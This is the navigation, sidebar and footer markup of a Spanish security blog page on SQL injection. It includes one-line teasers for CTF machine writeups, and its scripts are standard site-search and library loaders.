data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Finyecciones-sql%2F&text=Inyecciones+SQL+-+xDaNN1" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Finyecciones-sql%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/inyecciones-sql/">Inyecciones SQL</a><li><a href="/posts/oscp-review/">OSCP Review</a><li><a href="/posts/crto-review/">CRTO Review</a><li><a href="/posts/writeup-sizzle/">Sizzle Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/certificaci%C3%B3n/">Certificación</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-pandora/"><div class="card-body"> <em class="timeago small" data-ts="1653948000" > 2022-05-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pandora Writeup</h3><div class="text-muted small"><p> Máquina Easy, encontramos un puerto abierto en UDP que corre una versión sin casi seguridad, lo enumeramos hasta encontrar unas credenciales válidas para ssh, encontramos una web oculta vulnerable ...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-validation/"><div class="card-body"> <em class="timeago small" data-ts="1654034400" > 2022-06-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Validation Writeup</h3><div class="text-muted small"><p> Máquina Easy, en la que encontramos un SQLi, gracias a esto conseguimos escribir una webshell en el servidor consiguiendo un RCE, por último, encontramos unas credenciales en un archivo de configur...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-goodgames/"><div class="card-body"> <em class="timeago small" data-ts="1661724000" > 2022-08-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GoodGames Writeup</h3><div class="text-muted small"><p> Máquina Easy, nos aprovechamos de una inyección SQL para saltarnos el panel de login, convirtiendonos en el usuario administrador de la página, encontramos un subdominio y metemos en él unas creden...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/writeup-paper/" class="btn btn-outline-primary" prompt="Anterior"><p>Paper Writeup</p></a> <a href="/posts/writeup-forest/" class="btn btn-outline-primary" prompt="Nuevo"><p>Forest Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/xdann1">xdann1</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/certificaci%C3%B3n/">Certificación</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
